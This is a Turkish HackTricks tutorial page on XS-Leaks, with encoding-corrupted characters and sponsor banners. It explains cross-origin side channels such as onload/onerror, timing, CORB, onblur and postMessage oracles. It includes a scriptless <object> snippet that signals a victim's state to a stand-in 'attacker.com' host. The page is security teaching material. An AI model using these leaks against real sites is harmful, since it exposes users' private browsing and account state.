# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** bizi **takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerini** kullanarak **Ã§apraz kaynak bilgilerini** **Ã§Ä±karmak** iÃ§in kullanÄ±lan bir yÃ¶ntemdir.

Bu saldÄ±rÄ±da yer alan ana bileÅŸenler ÅŸunlardÄ±r:

* **ZayÄ±f Web**: Bilgilerin Ã§Ä±karÄ±lmasÄ±nÄ±n hedeflendiÄŸi web sitesi.
* **SaldÄ±rganÄ±n Web'i**: SaldÄ±rgan tarafÄ±ndan oluÅŸturulan, kurbanÄ±n ziyaret ettiÄŸi ve istismarÄ± barÄ±ndÄ±ran kÃ¶tÃ¼ niyetli web sitesi.
* **Dahil Etme YÃ¶ntemi**: ZayÄ±f Web'i SaldÄ±rganÄ±n Web'ine dahil etmek iÃ§in kullanÄ±lan teknik (Ã¶rneÄŸin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **Leak TekniÄŸi**: ZayÄ±f Web'in durumundaki farklÄ±lÄ±klarÄ± belirlemek iÃ§in dahil etme yÃ¶ntemi aracÄ±lÄ±ÄŸÄ±yla toplanan bilgilere dayanan teknikler.
* **Durumlar**: SaldÄ±rganÄ±n ayÄ±rt etmeyi hedeflediÄŸi ZayÄ±f Web'in iki potansiyel durumu.
* **Tespit Edilebilir FarklÄ±lÄ±klar**: SaldÄ±rganÄ±n ZayÄ±f Web'in durumunu Ã§Ä±karmak iÃ§in gÃ¼vendiÄŸi gÃ¶zlemlenebilir varyasyonlar.

### Tespit Edilebilir FarklÄ±lÄ±klar

ZayÄ±f Web'in durumlarÄ±nÄ± ayÄ±rt etmek iÃ§in analiz edilebilecek birkaÃ§ yÃ¶n vardÄ±r:

* **Durum Kodu**: **Ã‡eÅŸitli HTTP yanÄ±t durum kodlarÄ±** arasÄ±nda ayÄ±rt etme, sunucu hatalarÄ±, istemci hatalarÄ± veya kimlik doÄŸrulama hatalarÄ± gibi.
* **API KullanÄ±mÄ±**: Sayfalar arasÄ±nda **Web API'lerinin** kullanÄ±mÄ±nÄ± belirleme, Ã§apraz kaynak bir sayfanÄ±n belirli bir JavaScript Web API'sini kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± ortaya Ã§Ä±karma.
* **YÃ¶nlendirmeler**: FarklÄ± sayfalara yapÄ±lan navigasyonlarÄ± tespit etme, sadece HTTP yÃ¶nlendirmeleri deÄŸil, aynÄ± zamanda JavaScript veya HTML tarafÄ±ndan tetiklenenleri de.
* **Sayfa Ä°Ã§eriÄŸi**: **HTTP yanÄ±t gÃ¶vdesindeki** veya sayfa alt kaynaklarÄ±ndaki **deÄŸiÅŸiklikleri** gÃ¶zlemleme, Ã¶rneÄŸin **gÃ¶mÃ¼lÃ¼ Ã§erÃ§eve sayÄ±sÄ±** veya resimlerdeki boyut farklÄ±lÄ±klarÄ±.
* **HTTP BaÅŸlÄ±ÄŸÄ±**: **Belirli bir HTTP yanÄ±t baÅŸlÄ±ÄŸÄ±nÄ±n** varlÄ±ÄŸÄ±nÄ± veya muhtemel deÄŸerini not etme, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi baÅŸlÄ±klar dahil.
* **Zamanlama**: Ä°ki durum arasÄ±ndaki tutarlÄ± zaman farklÄ±lÄ±klarÄ±nÄ± fark etme.

### Dahil Etme YÃ¶ntemleri

* **HTML ElemanlarÄ±**: HTML, **Ã§apraz kaynak dahil etme** iÃ§in Ã§eÅŸitli elemanlar sunar, stil sayfalarÄ±, resimler veya betikler gibi, tarayÄ±cÄ±yÄ± HTML dÄ±ÅŸÄ± bir kaynaÄŸÄ± talep etmeye zorlar. Bu amaÃ§la potansiyel HTML elemanlarÄ±nÄ±n bir derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Ã‡erÃ§eveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarÄ±nÄ± doÄŸrudan saldÄ±rganÄ±n sayfasÄ±na gÃ¶mebilir. EÄŸer sayfa **Ã§erÃ§eve korumasÄ±na** sahip deÄŸilse, JavaScript, iÃ§erikWindow Ã¶zelliÄŸi aracÄ±lÄ±ÄŸÄ±yla Ã§erÃ§evelenmiÅŸ kaynaÄŸÄ±n pencere nesnesine eriÅŸebilir.
* **AÃ§Ä±lÄ±r Pencereler**: **`window.open`** yÃ¶ntemi, bir kaynaÄŸÄ± yeni bir sekmede veya pencerede aÃ§ar ve JavaScript'in yÃ¶ntemlerle ve Ã¶zelliklerle etkileÅŸimde bulunmasÄ± iÃ§in bir **pencere tutamacÄ±** saÄŸlar. AÃ§Ä±lÄ±r pencereler, genellikle tek oturum aÃ§ma iÅŸlemlerinde kullanÄ±lÄ±r, hedef kaynaÄŸÄ±n Ã§erÃ§eveleme ve Ã§erez kÄ±sÄ±tlamalarÄ±nÄ± aÅŸar. Ancak, modern tarayÄ±cÄ±lar aÃ§Ä±lÄ±r pencere oluÅŸturmayÄ± belirli kullanÄ±cÄ± eylemleriyle sÄ±nÄ±rlamaktadÄ±r.
* **JavaScript Ä°stekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doÄŸrudan istekler yapmaya izin verir. Bu yÃ¶ntemler, isteÄŸi takip etme gibi isteÄŸin Ã¼zerinde hassas kontrol saÄŸlar.

### Leak Teknikleri

* **Olay Ä°ÅŸleyici**: XS-Leaks'teki klasik bir leak tekniÄŸi, **onload** ve **onerror** gibi olay iÅŸleyicilerin kaynak yÃ¼kleme baÅŸarÄ±sÄ± veya baÅŸarÄ±sÄ±zlÄ±ÄŸÄ± hakkÄ±nda bilgi saÄŸlamasÄ±dÄ±r.
* **Hata MesajlarÄ±**: JavaScript istisnalarÄ± veya Ã¶zel hata sayfalarÄ±, ya doÄŸrudan hata mesajÄ±ndan ya da varlÄ±ÄŸÄ± ve yokluÄŸu arasÄ±ndaki farkÄ± ayÄ±rt ederek leak bilgisi saÄŸlayabilir.
* **KÃ¼resel SÄ±nÄ±rlar**: Bir tarayÄ±cÄ±nÄ±n fiziksel sÄ±nÄ±rlamalarÄ±, bellek kapasitesi veya diÄŸer zorunlu tarayÄ±cÄ± sÄ±nÄ±rlarÄ± gibi, bir eÅŸik aÅŸÄ±ldÄ±ÄŸÄ±nda sinyal verebilir ve leak tekniÄŸi olarak hizmet edebilir.
* **KÃ¼resel Durum**: TarayÄ±cÄ±larÄ±n **kÃ¼resel durumlarÄ±** (Ã¶rneÄŸin, GeÃ§miÅŸ arayÃ¼zÃ¼) ile tespit edilebilir etkileÅŸimler istismar edilebilir. Ã–rneÄŸin, bir tarayÄ±cÄ±nÄ±n geÃ§miÅŸindeki **giriÅŸ sayÄ±sÄ±**, Ã§apraz kaynak sayfalar hakkÄ±nda ipuÃ§larÄ± verebilir.
* **Performans API'si**: Bu API, **mevcut sayfanÄ±n performans detaylarÄ±nÄ±** saÄŸlar, belgenin ve yÃ¼klenen kaynaklarÄ±n aÄŸ zamanlamasÄ±nÄ± iÃ§erir, istenen kaynaklar hakkÄ±nda Ã§Ä±karÄ±mlar yapÄ±lmasÄ±na olanak tanÄ±r.
* **Okunabilir Nitelikler**: BazÄ± HTML nitelikleri **Ã§apraz kaynak olarak okunabilir** ve leak tekniÄŸi olarak kullanÄ±labilir. Ã–rneÄŸin, `window.frame.length` Ã¶zelliÄŸi, JavaScript'in bir web sayfasÄ±nda Ã§apraz kaynak olarak dahil edilen Ã§erÃ§eveleri saymasÄ±na olanak tanÄ±r.

## XSinator AracÄ± ve Makale

XSinator, **bilinen birkaÃ§ XS-Leaks'e karÅŸÄ± tarayÄ±cÄ±larÄ± kontrol etmek iÃ§in otomatik bir araÃ§tÄ±r** ve makalesinde aÃ§Ä±klanmÄ±ÅŸtÄ±r: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araca **ÅŸu adresten eriÅŸebilirsiniz** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**HariÃ§ Tutulan XS-Leaks**: XSinator'daki diÄŸer leak'lerle Ã§eliÅŸeceÄŸi iÃ§in **hizmet Ã§alÄ±ÅŸanlarÄ±na** dayanan XS-Leaks'leri hariÃ§ tutmak zorunda kaldÄ±k. AyrÄ±ca, belirli bir web uygulamasÄ±ndaki yanlÄ±ÅŸ yapÄ±landÄ±rma ve hatalara dayanan XS-Leaks'leri de **hariÃ§ tutmayÄ±** seÃ§tik. Ã–rneÄŸin, CrossOrigin Resource Sharing (CORS) yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±, postMessage sÄ±zÄ±ntÄ±sÄ± veya Cross-Site Scripting. AyrÄ±ca, genellikle yavaÅŸ, gÃ¼rÃ¼ltÃ¼lÃ¼ ve hatalÄ± olduklarÄ± iÃ§in zaman tabanlÄ± XS-Leaks'leri de hariÃ§ tuttuk.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Zaman TabanlÄ± Teknikler**

AÅŸaÄŸÄ±daki tekniklerin bazÄ±larÄ±, web sayfalarÄ±nÄ±n olasÄ± durumlarÄ±ndaki farklÄ±lÄ±klarÄ± tespit etmek iÃ§in zaman kullanacak. Bir web tarayÄ±cÄ±sÄ±nda zamanÄ± Ã¶lÃ§menin farklÄ± yollarÄ± vardÄ±r.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API'si, geliÅŸtiricilerin yÃ¼ksek Ã§Ã¶zÃ¼nÃ¼rlÃ¼klÃ¼ zaman Ã¶lÃ§Ã¼mleri almasÄ±na olanak tanÄ±r.\
SaldÄ±rganlarÄ±n Ã¶rtÃ¼k saatler oluÅŸturmak iÃ§in kÃ¶tÃ¼ye kullanabileceÄŸi Ã¶nemli sayÄ±da API vardÄ±r: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonlarÄ± ve diÄŸerleri.\
Daha fazla bilgi iÃ§in: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay Ä°ÅŸleyici Teknikleri

### Onload/Onerror

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, HTML ElemanlarÄ±
* **Tespit Edilebilir FarklÄ±lÄ±k**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Ã–zet**: Bir kaynaÄŸÄ± yÃ¼klemeye Ã§alÄ±ÅŸÄ±rken, onerror/onload olaylarÄ±, kaynaÄŸÄ±n baÅŸarÄ±lÄ±/baÅŸarÄ±sÄ±z bir ÅŸekilde yÃ¼klendiÄŸinde tetiklenir; durum kodunu belirlemek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã¶rneÄŸi**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Kod Ã¶rneÄŸi, **JS'den script nesnelerini yÃ¼klemeye** Ã§alÄ±ÅŸÄ±r, ancak **diÄŸer etiketler** (nesneler, stil sayfalarÄ±, resimler, sesler vb.) de kullanÄ±labilir. AyrÄ±ca, **etiketi doÄŸrudan** enjekte etmek ve `onload` ve `onerror` olaylarÄ±nÄ± etiketin iÃ§inde tanÄ±mlamak da mÃ¼mkÃ¼ndÃ¼r (JS'den enjekte etmek yerine).

Bu saldÄ±rÄ±nÄ±n ayrÄ±ca bir script'siz versiyonu da vardÄ±r:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda, eÄŸer `example.com/404` bulunamazsa `attacker.com/?error` yÃ¼klenecektir.

### Onload ZamanlamasÄ±

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Ã–zet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API'si**, bir isteÄŸi gerÃ§ekleÅŸtirmek iÃ§in ne kadar zaman gerektiÄŸini Ã¶lÃ§mek iÃ§in kullanÄ±labilir. Ancak, 50ms'den fazla sÃ¼ren gÃ¶revleri tanÄ±mlayabilen [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) baÅŸka bir Ã¶rnek:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload ZamanlamasÄ± + Zorunlu AÄŸÄ±r GÃ¶rev

Bu teknik, bir Ã¶ncekiyle aynÄ±dÄ±r, ancak **saldÄ±rgan** ayrÄ±ca **cevap olumlu veya olumsuz olduÄŸunda** **ilgili bir sÃ¼re** alacak bir eylemi **zorlayacaktÄ±r** ve o sÃ¼reyi Ã¶lÃ§ecektir.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload ZamanlamasÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Ã–zet:** [SharedArrayBuffer saati](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers), bir isteÄŸi gerÃ§ekleÅŸtirmek iÃ§in ne kadar zaman gerektiÄŸini Ã¶lÃ§mek iÃ§in kullanÄ±labilir. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynaÄŸÄ± almak iÃ§in geÃ§en sÃ¼re, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) olaylarÄ±nÄ± kullanarak Ã¶lÃ§Ã¼lebilir. **`beforeunload`** olayÄ±, tarayÄ±cÄ±nÄ±n yeni bir sayfaya geÃ§iÅŸ yapmadan Ã¶nce tetiklenirken, **`unload`** olayÄ± geÃ§iÅŸin gerÃ§ekten gerÃ§ekleÅŸtiÄŸi zaman meydana gelir. Bu iki olay arasÄ±ndaki zaman farkÄ±, **tarayÄ±cÄ±nÄ±n kaynaÄŸÄ± almak iÃ§in harcadÄ±ÄŸÄ± sÃ¼reyi** belirlemek iÃ§in hesaplanabilir.

### Sandboxed Ã‡erÃ§eve ZamanlamasÄ± + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Ã–zet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API'si, bir isteÄŸi gerÃ§ekleÅŸtirmek iÃ§in ne kadar zaman gerektiÄŸini Ã¶lÃ§mek iÃ§in kullanÄ±labilir. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) yokluÄŸunda, bir sayfanÄ±n ve alt kaynaklarÄ±nÄ±n aÄŸ Ã¼zerinden yÃ¼klenmesi iÃ§in gereken zamanÄ±n bir saldÄ±rgan tarafÄ±ndan Ã¶lÃ§Ã¼lebileceÄŸi gÃ¶zlemlenmiÅŸtir. Bu Ã¶lÃ§Ã¼m genellikle mÃ¼mkÃ¼ndÃ¼r Ã§Ã¼nkÃ¼ bir iframe'in `onload` iÅŸleyicisi, yalnÄ±zca kaynak yÃ¼klemesi ve JavaScript yÃ¼rÃ¼tmesi tamamlandÄ±ktan sonra tetiklenir. Script yÃ¼rÃ¼tmesinin getirdiÄŸi deÄŸiÅŸkenliÄŸi aÅŸmak iÃ§in, bir saldÄ±rgan `<iframe>` iÃ§inde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) niteliÄŸini kullanabilir. Bu niteliÄŸin dahil edilmesi, JavaScript yÃ¼rÃ¼tÃ¼lmesi gibi birÃ§ok iÅŸlevselliÄŸi kÄ±sÄ±tlar ve bÃ¶ylece aÄŸÄ±rlÄ±klÄ± olarak aÄŸ performansÄ±ndan etkilenen bir Ã¶lÃ§Ã¼m yapÄ±lmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**:
* **Summary**: EÄŸer doÄŸru iÃ§erik eriÅŸildiÄŸinde sayfanÄ±n hata vermesini saÄŸlayabilir ve herhangi bir iÃ§erik eriÅŸildiÄŸinde doÄŸru bir ÅŸekilde yÃ¼klenmesini saÄŸlayabilirseniz, o zaman zamanÄ± Ã¶lÃ§meden tÃ¼m bilgileri Ã§Ä±karmak iÃ§in bir dÃ¶ngÃ¼ oluÅŸturabilirsiniz.
* **Code Example**:

VarsayalÄ±m ki **iframe** iÃ§inde **gizli** iÃ§eriÄŸi olan **sayfayÄ±** **ekleyebilirsiniz**.

**KurbanÄ±n** "_**flag**_" iÃ§eren dosyayÄ± **Iframe** kullanarak aramasÄ±nÄ± saÄŸlayabilirsiniz (Ã¶rneÄŸin bir CSRF'yi istismar ederek). Iframe iÃ§inde _**onload olayÄ±**_ her zaman **en az bir kez** **Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ±** biliyorsunuz. Sonra, **iframe**'in **URL**'sini deÄŸiÅŸtirerek sadece URL iÃ§indeki **hash**'in **iÃ§eriÄŸini** deÄŸiÅŸtirebilirsiniz.

Ã–rneÄŸin:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

EÄŸer ilk URL **baÅŸarÄ±yla yÃ¼klendiyse**, o zaman **URL**'nin **hash** kÄ±smÄ±nÄ± **deÄŸiÅŸtirdiÄŸinizde** **onload** olayÄ± **tekrar tetiklenmeyecek**. Ama **eÄŸer** sayfa **yÃ¼klenirken** bir tÃ¼r **hata** almÄ±ÅŸsa, o zaman **onload** olayÄ± **tekrar tetiklenecektir**.

O zaman, eriÅŸildiÄŸinde **doÄŸru** bir ÅŸekilde yÃ¼klenmiÅŸ bir sayfa ile **hata** olan bir sayfa arasÄ±nda **ayrÄ±m** yapabilirsiniz.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**:
* **Summary:** EÄŸer **sayfa** **hassas** iÃ§eriÄŸi **dÃ¶nÃ¼yorsa**, **veya** kullanÄ±cÄ± tarafÄ±ndan **kontrol edilebilen** bir **iÃ§erik** dÃ¶nÃ¼yorsa. KullanÄ±cÄ± **geÃ§ersiz durumda** **geÃ§erli JS kodu** ayarlayabilir, her denemede **`<script>`** etiketleri iÃ§inde **yÃ¼kleyebilir**, bÃ¶ylece **geÃ§ersiz** durumlarda saldÄ±rganlarÄ±n **kodu** **Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ve **doÄŸru** durumlarda **hiÃ§bir ÅŸey** Ã§alÄ±ÅŸtÄ±rÄ±lmayacaktÄ±r.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML ElemanlarÄ±
* **Detectable Difference**: Durum Kodu & BaÅŸlÄ±klar
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)**, web sayfalarÄ±nÄ±n belirli hassas Ã§apraz kaynaklÄ± kaynaklarÄ± yÃ¼klemesini engelleyen bir gÃ¼venlik Ã¶nlemidir. Ancak, saldÄ±rganlar bu koruyucu davranÄ±ÅŸÄ± istismar edebilir. **CORB**'ye tabi bir yanÄ±t, `nosniff` ile birlikte _**CORB korumalÄ±**_ `Content-Type` ve `2xx` durum kodu dÃ¶ndÃ¼ÄŸÃ¼nde, **CORB** yanÄ±tÄ±n gÃ¶vdesini ve baÅŸlÄ±klarÄ±nÄ± temizler. Bunu gÃ¶zlemleyen saldÄ±rganlar, **durum kodu** (baÅŸarÄ± veya hata gÃ¶steren) ve `Content-Type` (koruma altÄ±nda olup olmadÄ±ÄŸÄ±nÄ± belirten) kombinasyonunu Ã§Ä±karabilir, bu da potansiyel bilgi sÄ±zÄ±ntÄ±sÄ±na yol aÃ§ar.
* **Code Example**:

Daha fazla bilgi iÃ§in daha fazla bilgi baÄŸlantÄ±sÄ±nÄ± kontrol edin.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: ID veya ad niteliÄŸinden hassas verileri sÄ±zdÄ±rÄ±n.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir **iframe** iÃ§inde bir **sayfayÄ±** **yÃ¼klemek** ve sayfanÄ±n belirtilen ID ile iframe'in **Ã¶gesine** **odaklanmasÄ±nÄ±** saÄŸlamak iÃ§in **`#id_value`** kullanmak mÃ¼mkÃ¼ndÃ¼r, ardÄ±ndan bir **`onblur`** sinyali tetiklendiÄŸinde, ID Ã¶ÄŸesi vardÄ±r.\
AynÄ± saldÄ±rÄ±yÄ± **`portal`** etiketleri ile de gerÃ§ekleÅŸtirebilirsiniz.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-up'lar
* **Detectable Difference**: API KullanÄ±mÄ±
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Bir postMessage'dan hassas bilgileri toplayÄ±n veya postMessages'Ä±n varlÄ±ÄŸÄ±nÄ± kullanarak kullanÄ±cÄ±nÄ±n sayfadaki durumunu bilmek iÃ§in bir oracle olarak kullanÄ±n.
* **Code Example**: `TÃ¼m postMessages'Ä± dinleyen herhangi bir kod.`

Uygulamalar genellikle [`postMessage` yayÄ±nlarÄ±nÄ±](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) farklÄ± kaynaklar arasÄ±nda iletiÅŸim kurmak iÃ§in kullanÄ±r. Ancak, bu yÃ¶ntem `targetOrigin` parametresi dÃ¼zgÃ¼n bir ÅŸekilde belirtilmediÄŸinde istemeden **hassas bilgileri** aÃ§Ä±ÄŸa Ã§Ä±karabilir, bu da herhangi bir pencerenin mesajlarÄ± almasÄ±na izin verir. AyrÄ±ca, bir mesajÄ± almanÄ±n kendisi bir **oracle** olarak iÅŸlev gÃ¶rebilir; Ã¶rneÄŸin, belirli mesajlar yalnÄ±zca oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±lara gÃ¶nderilebilir. Bu nedenle, bu mesajlarÄ±n varlÄ±ÄŸÄ± veya yokluÄŸu, kullanÄ±cÄ±nÄ±n kimlik durumu hakkÄ±nda bilgi verebilir, Ã¶rneÄŸin, kimlik doÄŸrulamasÄ±nÄ±n yapÄ±lÄ±p yapÄ±lmadÄ±ÄŸÄ±.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-up'lar
* **Detectable Difference**: API KullanÄ±mÄ±
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: WebSocket baÄŸlantÄ± limitini aÅŸmak, bir Ã§apraz kaynak sayfasÄ±nÄ±n WebSocket baÄŸlantÄ± sayÄ±sÄ±nÄ± sÄ±zdÄ±rÄ±r.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

